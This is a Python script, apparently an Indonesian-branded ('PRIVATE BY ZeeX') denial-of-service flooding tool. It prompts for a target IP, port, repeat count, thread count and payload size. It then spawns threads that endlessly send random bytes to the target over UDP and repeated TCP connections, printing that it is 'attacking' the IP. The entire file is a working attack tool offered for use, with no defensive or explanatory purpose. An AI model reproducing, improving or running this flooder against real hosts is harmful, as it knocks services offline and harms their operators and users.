import random

import time

import socket

import os,sys

import threading

os.system("clear")

print("""\033[91mPRIVATE BY ZeeX""")

time.sleep(3)

os.system("clear")

ip = str(input("""\033[92mMASUKAN IP : """))

time.sleep(2)

port = int(input("""\033[93mMASUKAN PORT : """))

time.sleep(2)

times = int(input("""\033[94mMASUKAN TIMES : """))

time.sleep(2)

thread = int(input("""\033[95mMASUKAN THREAD : """))

time.sleep(2)

urandom = int(input("""\033[91mMASUKAN URANDOM : """))

os.system("clear")

def run():

    data = random._urandom(urandom)

    i = random.choice(("[ZEEX]","[ZEEX]","[ZEEX]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            addr = (str(ip),int(port))

            for x in range(times):

                s.sendto(data,addr)

            print(f"""\033[91mMENYERANG IP {ip} DAN MEMBANTAI PORT {port}""")

        except:

            print("WIBU")

def run2():

    data = random._urandom(urandom)

    i = random.choice(("[ZEEX]","[ZEEX]","[ZEEX]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(f"""\033[91mMENYERANG IP {ip} DAN MEMBANTAI PORT {port}""")

        except:

            s.close()

            print("WIBU")

def run3():

    data = random._urandom(urandom)

    i = random.choice(("[ZEEX]","[ZEEX]","[ZEEX]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(f"""\033[91mMENYERANG IP {ip} DAN MEMBANTAI PORT {port}""")

        except:

            s.close()

            print("WIBU")

for y in range(thread):

  th = threading.Thread(target= run)

  th.start()

  th = threading.Thread(target= run2)

  th.start()

  th = threading.Thread(target= run3)

  th.start()
